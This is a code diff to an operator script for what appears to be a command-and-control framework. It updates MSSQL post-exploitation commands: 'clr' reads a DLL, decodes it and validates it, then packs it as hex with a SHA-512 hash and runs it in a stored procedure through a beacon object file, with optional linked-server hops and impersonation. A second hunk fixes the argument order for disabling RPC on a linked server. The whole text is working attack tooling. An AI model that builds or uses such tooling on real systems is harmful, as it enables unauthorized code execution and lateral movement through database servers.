@@ -98,12 +98,13 @@ _cmd_checkrpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var _cmd_clr = ax.create_command("clr", "Load and execute a .NET assembly in a stored procedure", "mssql clr [-d database] [-l linkedserver] [-i impersonate] [server] [dll_path] [function]");
+var _cmd_clr = ax.create_command("clr", "Load and execute a .NET assembly in a stored procedure", "mssql clr -h [hash] [-d database] [-l linkedserver] [-i impersonate] [server] [dll_path] [function]");
+_cmd_clr.addArgFlagString("-h", "hash",         "Required: SHA-512 hash of DLL", "");
 _cmd_clr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
 _cmd_clr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
 _cmd_clr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
 _cmd_clr.addArgString("server",   true, "SQL server to connect to");
-_cmd_clr.addArgString("dll_path", true, "Path to the .NET assembly DLL");
+_cmd_clr.addArgString("dll_path", true, "Path to .NET assembly DLL");
 _cmd_clr.addArgString("function", true, "Entry-point function name");
 _cmd_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let server       = parsed_json["server"];
@@ -112,13 +113,67 @@ _cmd_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let database     = parsed_json["database"];
     let linkedserver = parsed_json["linkedserver"];
     let impersonate  = parsed_json["impersonate"];
+    let userHash     = parsed_json["hash"];
 
-    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr", [server, dllPath, functionName, database, linkedserver, impersonate] );
+    let base64Data = ax.file_read(dllPath);
+
+    if(base64Data.length === 0) {
+        throw new Error(`file ${dllPath} not readed`);
+    }
+
+    let binaryString = "";
+
+    try {
+        let b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        base64Data = base64Data.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+
+        for(let i = 0; i < base64Data.length; i += 4) {
+            let e1 = b64.indexOf(base64Data.charAt(i));
+            let e2 = b64.indexOf(base64Data.charAt(i + 1));
+            let e3 = b64.indexOf(base64Data.charAt(i + 2));
+            let e4 = b64.indexOf(base64Data.charAt(i + 3));
+
+            let c1 = (e1 << 2) | (e2 >> 4);
+            let c2 = ((e2 & 15) << 4) | (e3 >> 2);
+            let c3 = ((e3 & 3) << 6) | e4;
+
+            binaryString += String.fromCharCode(c1);
+            if(e3 !== 64) binaryString += String.fromCharCode(c2);
+            if(e4 !== 64) binaryString += String.fromCharCode(c3);
+        }
+    } catch(e) {
+        throw new Error(`Base64 decode failed: ${e.message}`);
+    }
+
+    // Convert binary to hex
+    let hexString = "";
+    for(let i = 0; i < binaryString.length; i++) {
+        let byte = binaryString.charCodeAt(i) & 0xFF;
+        let hex = byte.toString(16);
+        hexString += (hex.length === 1 ? '0' + hex : hex).toUpperCase();
+    }
+
+    // Validate DLL header
+    if(hexString.substring(0, 4) !== "4D5A") {
+        throw new Error(`Invalid DLL header: got ${hexString.substring(0, 4)}`);
+    }
+
+
+    if(!userHash || userHash.length === 0) {
+        throw new Error("SHA-512 hash is required. Use -h flag to specify the hash.");
+    }
+
+    let dllHash = userHash.toUpperCase();
+
+    // Pack all as cstr (7 strings, NO bytes type)
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr",
+        [server, database, linkedserver, impersonate, functionName, dllHash, hexString]);
     let bof_path = ax.script_dir() + "_bin/SQL/clr." + ax.arch(id) + ".o";
-    let message = "Task: Load and execute .NET assembly";
+    let message = "Task: execute CLR assembly " + ax.file_basename(dllPath);
 
-    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
+
 
 
 
@@ -215,7 +270,7 @@ _cmd_disablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
     let database     = parsed_json["database"];
     let impersonate  = parsed_json["impersonate"];
 
-    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, linkedserver, database, impersonate, "rpc", "FALSE"] );
+    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "FALSE"] );
     let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
     let message = "Task: Disable RPC on linked server";
 
